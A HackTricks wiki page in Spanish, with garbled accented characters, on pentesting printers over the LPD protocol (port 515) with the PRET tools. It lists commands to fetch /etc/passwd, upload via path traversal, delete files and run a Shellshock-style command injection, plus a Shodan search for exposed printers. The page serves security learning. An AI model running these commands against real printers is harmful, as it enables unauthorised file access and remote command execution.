{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### **Introducci贸n al Protocolo LPD**

En la d茅cada de 1980, se desarroll贸 el **protocolo Line Printer Daemon (LPD)** en Berkeley Unix, que m谩s tarde se formaliz贸 a trav茅s de RFC1179. Este protocolo opera sobre el puerto 515/tcp, permitiendo interacciones a trav茅s del comando `lpr`. La esencia de la impresi贸n a trav茅s de LPD implica enviar un **archivo de control** (para especificar los detalles del trabajo y el usuario) junto con un **archivo de datos** (que contiene la informaci贸n de impresi贸n). Mientras que el archivo de control permite la selecci贸n de **varios formatos de archivo** para el archivo de datos, el manejo de estos archivos est谩 determinado por la implementaci贸n espec铆fica de LPD. Una implementaci贸n ampliamente reconocida para sistemas similares a Unix es **LPRng**. Notablemente, el protocolo LPD puede ser explotado para ejecutar **PostScript malicioso** o **trabajos de impresi贸n PJL**.

### **Herramientas para Interactuar con Impresoras LPD**

[**PRET**](https://github.com/RUB-NDS/PRET) introduce dos herramientas esenciales, `lpdprint` y `lpdtest`, que ofrecen un m茅todo sencillo para interactuar con impresoras compatibles con LPD. Estas herramientas permiten una variedad de acciones, desde imprimir datos hasta manipular archivos en la impresora, como descargar, subir o eliminar:
```python
# To print a file to an LPD printer
lpdprint.py hostname filename
# To get a file from the printer
lpdtest.py hostname get /etc/passwd
# To upload a file to the printer
lpdtest.py hostname put ../../etc/passwd
# To remove a file from the printer
lpdtest.py hostname rm /some/file/on/printer
# To execute a command injection on the printer
lpdtest.py hostname in '() {:;}; ping -c1 1.2.3.4'
# To send a mail through the printer
lpdtest.py hostname mail lpdtest@mailhost.local
```
Para las personas interesadas en explorar m谩s a fondo el 谩mbito del **printer hacking**, se puede encontrar un recurso completo aqu铆: [**Hacking Printers**](http://hacking-printers.net/wiki/index.php/Main_Page).

# Shodan

* `port 515`


{% hint style="success" %}
Aprende y practica AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci贸n**](https://github.com/sponsors/carlospolop)!
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
